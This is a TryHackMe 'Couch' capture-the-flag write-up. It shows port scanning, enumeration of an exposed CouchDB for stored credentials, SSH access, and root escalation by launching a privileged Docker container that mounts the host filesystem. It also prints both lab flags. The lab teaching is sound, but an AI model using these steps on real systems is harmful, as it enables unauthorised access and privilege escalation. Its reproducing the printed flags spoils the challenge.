# TryHackMe — Couch

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-CouchDB%20%7C%20Linux%20Privilege%20Escalation-blue)

## Overview

This write-up documents my approach to the **Couch** room on TryHackMe.
The attack path is:

1.  Enumerate the target and discover CouchDB on port `5984`.
2.  Explore the exposed CouchDB web interface and discover credentials in a document.
3.  Use the recovered credentials to connect over SSH as `atena`.
4.  Inspect the user's shell history and discover a Docker API endpoint listening locally on port `2375`.
5.  Use the exposed Docker API to start a privileged container with the host filesystem mounted, then read the root flag.


## Attack chain

``` text
Nmap scan
   |
   v
SSH (22) + CouchDB (5984)
   |
   v
Browse CouchDB Futon / inspect databases
   |
   v
Find passwordbackup document in `secret`
   |
   v
SSH as atena
   |
   v
Inspect .bash_history
   |
   v
Discover Docker API at 127.0.0.1:2375
   |
   v
Launch privileged Alpine container with / mounted at /mnt
   |
   v
Read /mnt/root/root.txt
```

## 1. Port scanning and service enumeration

Run a full TCP port scan with service detection:

``` bash
nmap -sV -p- <TARGET_IP>
```

The screenshot shows these open ports:

          Port Service   Finding
  ------------ --------- -------------------------
      `22/tcp` SSH       OpenSSH 7.2p2 on Ubuntu
    `5984/tcp` HTTP      CouchDB 1.6.1

<img width="809" height="287" alt="1" src="https://github.com/user-attachments/assets/16ee3af9-fa19-4640-8281-3d971e7c222c" />

CouchDB commonly exposes its HTTP API on port `5984`. The next step is to inspect the web interface and determine whether access controls are configured correctly.

## 2. Enumerate CouchDB endpoints

Use directory/content discovery against the CouchDB HTTP service:

``` bash
feroxbuster -u http://<TARGET_IP>:5984/ -w /usr/share/wordlists/dirb/common.txt -x pdf,txt,log,bak,php,md,zip,jpg,png,jpeg,js,sh -s 200,301,302,303,304,401,403 --scan-dir-listings -t 100
```

The recorded scan identifies CouchDB endpoints including:

-   `/`
-   `/_stats`
-   `/_config`
-   `/_utils/`
-   `/_utils/session.html`

<img width="1280" height="703" alt="2" src="https://github.com/user-attachments/assets/1c9f8a33-b7d1-4a0f-9ba1-c42cebf4368c" />

Open the CouchDB web interface:

``` text
http://<TARGET_IP>:5984/_utils/
```

The interface shows several databases, including `couch` and `secret`.

<img width="1290" height="525" alt="3" src="https://github.com/user-attachments/assets/d05cb6bc-f58e-4c14-a05d-e4fe7b8a00b1" />

## 3. Find credentials in the `secret` database

Open the `secret` database and inspect the document shown in the screenshot. It contains a field named `passwordbackup` with a username and password.

<img width="1074" height="380" alt="4" src="https://github.com/user-attachments/assets/13b8ebce-d5e0-4df4-9456-e232c7770fb8" />

The visible credential is shown in the form:

``` text
atena:<PASSWORD_FROM_DOCUMENT>
```

Use the value from your own lab instance rather than copying a password from a different run. This is sensitive information exposed through an unauthenticated or insufficiently protected CouchDB interface.

## 4. Connect to the target over SSH

Use the recovered credentials to connect as `atena`:

``` bash
ssh atena@<TARGET_IP>
```

After authenticating, verify the account:

``` bash
id
```

The screenshot confirms a shell as `atena` on Ubuntu 16.04.7 LTS.

<img width="1069" height="333" alt="5" src="https://github.com/user-attachments/assets/4ce96899-078d-4323-bcc8-32ab6b2a51c3" />

## 5. Retrieve the user flag

List the home directory and read the user flag:

``` bash
ls
cat user.txt
```

The screenshot shows the user flag:

``` text
THM{1ns3cure_couchdb}
```

<img width="269" height="72" alt="6" src="https://github.com/user-attachments/assets/f77fe0f3-a9b1-4212-818e-8a196451648a" />

## 6. Check sudo permissions and inspect the home directory

Check whether the current account can run commands with `sudo`:

``` bash
sudo -l
```

The screenshot shows that `atena` is not allowed to run sudo commands.
Continue by listing hidden files:

``` bash
ls -la
```

The directory contains `.bash_history`, which is useful for
understanding commands previously run by the account.

<img width="583" height="293" alt="7" src="https://github.com/user-attachments/assets/4718a930-eb1c-4db7-9c1e-ed47bc61d908" />

## 7. Inspect `.bash_history`

Read the shell history:

``` bash
cat .bash_history
```

The history includes a command that contacts a Docker API listening on localhost port `2375`:

``` bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

This is the key finding. An accessible Docker API can be dangerous when it allows a user to create privileged containers and mount the host filesystem.

<img width="502" height="140" alt="8" src="https://github.com/user-attachments/assets/31f3369d-b2b4-4d85-bed6-3edb13730eb2" />
<img width="727" height="94" alt="9" src="https://github.com/user-attachments/assets/c2cff500-0ef2-4c38-9331-12c098dc69e5" />

## 8. Use the exposed Docker API

Run the command shown in the shell history:

``` bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

What the options do:

-   `-H 127.0.0.1:2375` --- connects to the Docker API on localhost port
    `2375`.
-   `run` --- creates and starts a container.
-   `--rm` --- removes the container when it exits.
-   `-it` --- allocates an interactive terminal.
-   `--privileged` --- grants the container extensive privileges.
-   `--net=host` --- uses the host's network namespace.
-   `-v /:/mnt` --- mounts the host root filesystem at `/mnt` inside the
    container.
-   `alpine` --- uses the Alpine Linux image.

Inside the container, check the current identity:

``` sh
whoami
```

The screenshot shows:

``` text
root
```

<img width="801" height="93" alt="10" src="https://github.com/user-attachments/assets/346809b4-bed8-4f75-a5e0-93989e996742" />

Because the host filesystem is mounted at `/mnt`, the host's root directory is accessible through `/mnt` from inside the container.

## 9. Retrieve the root flag

Inside the container, locate and read the root flag:

``` sh
find / -name root.txt 2>/dev/null
cat /mnt/root/root.txt
```

The screenshot shows the root flag:

``` text
THM{RCE_using_Docker_API}
```

<img width="419" height="85" alt="11" src="https://github.com/user-attachments/assets/39d7c167-c384-4e6a-a11b-3e19dbecd7a2" />

## Flags

  Flag   Value
  ------ -----------------------------
  User   `THM{1ns3cure_couchdb}`
  Root   `THM{RCE_using_Docker_API}`

